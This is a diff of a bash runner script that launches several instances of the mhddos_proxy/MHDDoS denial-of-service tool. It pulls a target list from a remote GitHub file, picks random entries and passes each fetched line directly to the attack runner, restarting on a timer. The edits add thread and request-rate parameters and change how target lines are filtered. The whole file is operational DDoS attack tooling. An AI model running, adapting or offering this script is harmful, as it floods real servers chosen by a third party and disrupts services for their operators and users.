@@ -13,10 +13,13 @@
 ## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
 num_of_copies="${1:-2}"
 
+
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
 ## By default 900s (15m), can be passed as second parameter
 restart_interval="${2:-900}"
+threads="${3:-500}"
+rpc="${4:-50}"
 
 #Just in case kill previous copy of mhddos_proxy
 pkill -f start.py
@@ -48,7 +51,7 @@ while true
 echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py" | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "-p" | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
@@ -60,7 +63,7 @@ do
    echo -e "Choosen target(s):\n"
    for i in $random_numbers
    do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
+             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^-p")")
              echo -e "    "$target"\n"
    done
       
@@ -68,15 +71,14 @@ do
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "-p")")
            
             #echo $cmd_line
-            python3 ~/mhddos_proxy/$cmd_line"-p 30"&
+            python3 ~/mhddos_proxy/runner.py" "$cmd_line&
    done
 echo -e "#####################################\n"
 sleep $restart_interval
 echo -e "RESTARTING\n"
 pkill -f start.py #In theory should work but doesn't give good results
 pkill python3 #It just works (c)
-sleep 2
 done
